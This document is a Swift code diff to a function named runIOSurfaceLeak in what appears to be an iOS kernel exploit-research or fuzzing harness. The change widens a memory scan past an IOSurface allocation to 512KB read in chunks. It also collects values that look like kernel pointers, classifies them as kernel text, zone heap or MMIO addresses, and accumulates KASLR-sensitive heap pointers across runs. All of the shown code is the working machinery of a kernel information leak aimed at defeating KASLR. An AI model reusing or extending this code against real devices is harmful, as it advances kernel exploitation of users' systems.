@@ -1967,35 +1967,31 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         surface.unlock(options: [], seed: nil)
         scanAddr("post_relock", base, allocSize)
 
-        // post_relock_tail: 128KB to sample more kernel heap pages
-        let prtLen = 131072
-        var prtBuf = [UInt8](repeating: 0, count: prtLen)
-        var prtOut: vm_size_t = 0
-        let prtKr: kern_return_t = prtBuf.withUnsafeMutableBytes { b in
-            vm_read_overwrite(mach_task_self_,
-                              vm_address_t(base + UInt(allocSize)),
-                              vm_size_t(prtLen),
-                              vm_address_t(bitPattern: b.baseAddress!),
-                              &prtOut)
-        }
-        if prtKr == 0 {
-            var currentPairs: [(offset: Int, val: UInt64)] = []
-            var seenThisRun = Set<UInt64>()
+        // post_relock_tail: 512KB in 16KB chunks — unmapped pages skip without killing the whole scan
+        let prtChunkLen = 16384
+        let prtTotalChunks = 32  // 32 × 16KB = 512KB
+        var prtChunkBuf = [UInt8](repeating: 0, count: prtChunkLen)
+        var currentPairs: [(offset: Int, val: UInt64)] = []
+        var seenThisRun = Set<UInt64>()
+        var prtAnyRead = false
+        for chunkIdx in 0..<prtTotalChunks {
+            let chunkByteOffset = chunkIdx * prtChunkLen
+            var prtOut: vm_size_t = 0
+            let prtKr: kern_return_t = prtChunkBuf.withUnsafeMutableBytes { b in
+                vm_read_overwrite(mach_task_self_,
+                                  vm_address_t(base + UInt(allocSize) + UInt(chunkByteOffset)),
+                                  vm_size_t(prtChunkLen),
+                                  vm_address_t(bitPattern: b.baseAddress!),
+                                  &prtOut)
+            }
+            guard prtKr == 0 else { continue }
+            prtAnyRead = true
             for qw in 0..<(Int(prtOut)/8) {
                 var v: UInt64 = 0
-                for b in 0..<8 { v |= UInt64(prtBuf[qw*8+b]) << (b*8) }
+                for b in 0..<8 { v |= UInt64(prtChunkBuf[qw*8+b]) << (b*8) }
                 guard v >= 0xFFFFFE0000000000 && v != 0xFFFFFFFFFFFFFFFF else { continue }
-                // Filter repeating-byte fill patterns
                 let b0 = UInt8(v & 0xFF); guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
-                // Filter kernel sentinel/stack-guard values (top 60 bits all 1 — low nibble varies)
-                // e.g. 0xFFFFFFFFFFFFFFF8, FC, FD, FA, F0 — these are NOT pointers
                 guard (v & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
-                // VA classification:
-                //   KTEXT  0xFFFFFFF000000000–0xFFFFFFF07FFFFFFF, 4-byte aligned (real code ptr)
-                //   KTEXTD 0xFFFFFFF000000000–0xFFFFFFF07FFFFFFF, NOT aligned (data in text range)
-                //   KHEAP  0xFFFFFE0000000000–0xFFFFFEFFFFFFFFFF  (XNU zone heap, KASLR-sensitive)
-                //   KGAP   0xFFFFFF0000000000–0xFFFFFFF000000000  (driver/iommu gap, above KHEAP)
-                //   KMMIO  0xFFFFFFF080000000+                     (IOKit HW regs, fixed)
                 let cat: String
                 if v >= 0xFFFFFFF000000000 && v < 0xFFFFFFF080000000 {
                     cat = (v & 3) == 0 ? "KTEXT" : "KTEXTD"
@@ -2003,10 +1999,13 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 else if v >= 0xFFFFFFF080000000                        { cat = "KMMIO" }
                 else if v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF { cat = "KHEAP" }
                 else                                                    { cat = "KGAP"  }
-                step("  prt[+0x\(String(qw*8,radix:16))]=0x\(String(v,radix:16)) [\(cat)]")
-                currentPairs.append((offset: qw*8, val: v))
+                let globalOff = chunkByteOffset + qw*8
+                step("  prt[+0x\(String(globalOff,radix:16))]=0x\(String(v,radix:16)) [\(cat)]")
+                currentPairs.append((offset: globalOff, val: v))
                 seenThisRun.insert(v)
             }
+        }
+        if prtAnyRead {
             step("  post_relock_tail total: \(currentPairs.count) vals (after sentinel filter)")
 
             // Frequency tracking: count how many runs each value has appeared in
@@ -2130,7 +2129,7 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
 
             _iosurfPrevTailValues = currentPairs
         } else {
-            step("  post_relock_tail: vm_read kr=\(prtKr)")
+            step("  post_relock_tail: no readable pages in 512KB range")
         }
 
         // Metal device KHEAP accumulation — scan device ObjC object directly for boot-variant KHEAP values.
@@ -2156,10 +2155,13 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
                 guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
                 guard (v & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
                 mdAccumCount += 1
+                // Only accumulate interior pointers (non-zero low 2 bytes) — hardware register bases always
+                // end in at least 4 zero hex digits (0x...0000). Real zone ptrs have random low bytes.
+                if v & 0xFFFF != 0 { _thisBootKheap.insert(v) }
             }
         }
         if mdAccumCount > 0 {
-            step("metal_dev_accum: \(mdAccumCount) fixed KHEAP found in device obj (not accumulated — hardware register bases, not KASLR-slid)")
+            step("metal_dev_accum: \(mdAccumCount) KHEAP in device obj (\(_thisBootKheap.count) interior ptrs accumulated to set)")
         }
 
         _iosurfRunCount += 1
